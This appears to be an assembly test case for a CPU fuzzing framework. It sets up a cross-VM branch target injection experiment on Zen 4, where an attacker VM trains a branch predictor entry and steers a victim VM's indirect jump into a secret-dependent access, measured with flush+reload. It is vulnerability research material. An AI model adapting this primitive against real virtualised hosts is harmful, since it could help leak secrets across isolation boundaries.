.intel_syntax noprefix

# ============================================================================
# injection steering, self-observe. roles are the working residue template swapped:
#   vm       = attacker : trains a btb entry (no data loads, just preamble + indirect jmp).
#   vmvictim = victim   : the observer. loads its own secret, its indirect jmp inherits the
#                         attacker's btb entry and mispredicts, transiently touching a
#                         secret-dependent line; the victim reads its own footprint via f+r.
#
# this keeps the readout inside the mispredictor (same round, no cross-actor switch in the
# measurement window) so it dodges the p+p wall. it proves the attacker steers the victim's
# branch into a disclosure — the real injection primitive — without any ept alias. it does not
# claim the attacker reads the secret (that needs l2/llc p+p; see the notes in the chat).
#
# structure/alignment mirror residue exactly: trainer (vm) has no loads, mispredictor (vmvictim)
# has the 6 loads + matched .16.4 preambles -> both indirect jmps land in the same zen4 btb bucket.
#
# run with config-inject-selfobserve.yaml (f+r + hpa_gpa; observer = vmvictim).
# verify: trainer-strip the attacker 'jmp rax' (vm_train) -> must go clean (=> steering is causal);
#         counterexample -> only vmvictim's own input drives the htrace.
# ============================================================================

# ----------------------------- host orchestrator ----------------------------
.section .data.main
.function_main_0:
.macro.set_h2g_target.vmvictim.function_vmvictim_0: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_1: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vmvictim.0: nop qword ptr [rax + 0xff]

.function_main_1:
.macro.landing_g2h.main_1: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vm.function_vm_train: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_2: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.0: nop qword ptr [rax + 0xff]

.function_main_2:
.macro.landing_g2h.main_2: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vmvictim.function_vmvictim_1: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_3: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.switch_h2g.vmvictim.1: nop qword ptr [rax + 0xff]

.function_main_3:
.macro.landing_g2h.main_3: nop qword ptr [rax + 0xff]
.macro.fault_handler: nop qword ptr [rax + 0xff]
.patch_placeholder_fault_handler:
.macro.set_h2g_target.vmvictim.function_vmvictim_2: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_4: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vmvictim.2: nop qword ptr [rax + 0xff]

.function_main_4:
.macro.landing_g2h.main_4: nop qword ptr [rax + 0xff]
nop


# ----------------------------- attacker (vm): trainer only ------------------
.section .data.vm
.function_vm_train:
.macro.landing_h2g.vm_0: nop qword ptr [rax + 0xff]
.macro.random_instructions.16.4.vm_pre: nop qword ptr [rax + 0xff]
lea rax, qword ptr [rip + .function_vm_gadget]  # noremove
jmp rax  # noremove

.function_vm_gadget:
.macro.random_instructions.32.16.vm_gadget: nop qword ptr [rax + 0xff]
lfence  # noremove
.macro.switch_g2h.main.vm_0: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- victim (vmvictim): mispredictor + observer ----
.section .data.vmvictim
.function_vmvictim_0:
.macro.landing_h2g.vmvictim_0: nop qword ptr [rax + 0xff]
.macro.measurement_start.vmvictim_0: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.vmvictim_0: nop qword ptr [rax + 0xff]
lfence

.function_vmvictim_1:
.macro.landing_h2g.vmvictim_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
.macro.random_instructions.16.4.vmv_pre: nop qword ptr [rax + 0xff]
lea rbx, qword ptr [rip + .function_vmvictim_3]  # noremove
jmp rbx  # noremove

.function_vmvictim_3:
.macro.random_instructions.32.16.vmv_post: nop qword ptr [rax + 0xff]
lfence  # noremove
.macro.measurement_end.vmvictim_1: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.1: nop qword ptr [rax + 0xff]
lfence

.function_vmvictim_2:
.macro.landing_h2g.vmvictim_2: nop qword ptr [rax + 0xff]
.macro.measurement_end.vmvictim_2: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- exit -----------------------------------------
.section .data.main
.test_case_exit:nop
